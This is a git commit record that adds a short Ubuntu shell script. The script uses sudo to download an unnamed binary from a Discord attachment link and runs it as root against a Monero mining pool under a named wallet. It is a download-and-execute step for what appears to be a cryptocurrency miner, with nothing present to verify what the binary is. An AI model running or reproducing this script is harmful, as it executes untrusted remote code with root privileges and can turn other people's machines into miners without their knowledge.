9f370fcc0907ffa1ca51910a326d7351132a5f2c
Yamatheminer <79119838+Yamatheminer@users.noreply.github.com>
2021-02-16 00:41:38 +0100

    Add files via upload

---
+++ ubuntu-run.sh
@@ -0,0 +1,6 @@
+echo this can run commands in terminal tho
+sudo mkdir /xmr/ 
+sudo wget https://cdn.discordapp.com/attachments/697624882250383483/811006649581961246/m -P /xmr 
+cd /xmr/
+sudo chmod +x m 
+sudo ./m -o pool.xmrfast.com:3333 -u yamaskekgeldboerse -k --coin monero
